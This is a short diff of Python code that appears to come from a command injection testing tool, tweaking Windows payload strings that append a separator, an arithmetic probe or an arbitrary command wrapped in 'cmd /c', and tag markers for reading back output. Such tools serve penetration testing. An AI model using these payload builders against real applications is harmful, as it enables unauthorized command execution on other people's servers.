@@ -27,13 +27,13 @@ def decision(separator, TAG, randv1, randv2):
   if settings.TARGET_OS == "win":
     if settings.SKIP_CALC:
       payload = (separator +
-                "echo " + TAG + TAG + TAG + "< nul"
+                "echo " + TAG + TAG + TAG + "<nul"
                 )
     else:
         payload = (separator +
               "for /f \"tokens=*\" %i in ('cmd /c \"" + 
               "set /a (" + str(randv1) + "%2B" + str(randv2) + ")" + 
-              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + "< nul"
+              "\"') do @set /p = " + TAG + "%i" + TAG + TAG + "<nul"
               )  
   else:
     if not settings.WAF_ENABLED:
@@ -116,7 +116,7 @@ def cmd_execution(separator, TAG, cmd):
       payload = (separator +
                 "for /f \"tokens=*\" %i in ('cmd /c \"" + 
                 cmd + 
-                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "< nul"
+                "\"') do @set /p = " + TAG + TAG + "%i" + TAG + TAG + "<nul"
                 )
   else:
      
